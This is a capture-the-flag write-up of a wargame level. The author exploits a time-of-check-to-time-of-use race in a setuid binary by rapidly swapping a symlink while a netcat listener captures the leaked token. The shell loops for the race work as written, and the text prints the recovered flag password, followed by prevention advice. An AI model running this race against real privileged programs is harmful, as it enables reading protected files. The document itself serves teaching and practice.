# Level 10 - TOCTOU Race Condition

## Objective
Exploit a race condition between access check and file reading.

## My Notes

Found a setuid binary. Used strings to see what it does:
```bash
strings level10
# %s file host
# sends file to host if you have access to it
# access
# open
```

Binary sends files to a network host on port 6969. It uses `access()` to check permissions, then `open()` to read the file. This is a TOCTOU vulnerability - there's a time gap between check and use.

The vulnerable pattern:
```c
if (access(filename, R_OK) == 0) {   // CHECK
    fd = open(filename, O_RDONLY);    // USE (time gap here!)
}
```

Attack plan:
1. Create a symlink pointing to a file I own (passes access check)
2. Rapidly swap symlink to point to token file
3. Hope the binary opens it between the swap

Set up two processes:
1. Racer: rapidly swaps symlink between my file and token
2. Trigger: repeatedly runs the binary with the symlink

```bash
# Create file I own
touch /tmp/myfile && chmod 777 /tmp/myfile

# Terminal 1: The racer
while true; do
    ln -sf ~/token /tmp/race
    ln -sf /tmp/myfile /tmp/race
done &

# Terminal 2: The trigger
for i in $(seq 1 100); do
    nc -l 6969 >> /tmp/output &
    ./level10 /tmp/race 127.0.0.1
done

# Check result
cat /tmp/output | grep -v "^\.\*" | sort -u
```

Got token: `feulo4b72j7edeahuete3no7c`

```bash
su flag10  # Password: feulo4b72j7edeahuete3no7c
getflag
```

## Key Takeaways

**TOCTOU (Time of Check to Time of Use):** Race condition where program checks a condition, state changes in the gap, then program acts assuming condition still holds.

**access() function:** Checks if real user ID can access file. Problem: checks using invoker's permissions, but SUID programs operate with elevated privileges.

**Symlinks in race conditions:** Perfect for TOCTOU - easy to create/modify, transparent to operations, swapping is atomic with `ln -sf`.

**Probability:** It's probabilistic - run many attempts until winning the race.

**Network component:** Binary sends over TCP to port 6969, need listeners to capture output.

## Tools Used
- `ln -s` - Create symlinks
- `nc` - Network listener
- Background processes and loops for racing

## Prevention
- Don't use access() for security checks - just try to open and handle errors
- Use file descriptors, not paths - open first, then check with fstat()
- Drop privileges early in SUID programs
- Use O_NOFOLLOW to reject symlinks
- Use atomic operations when possible
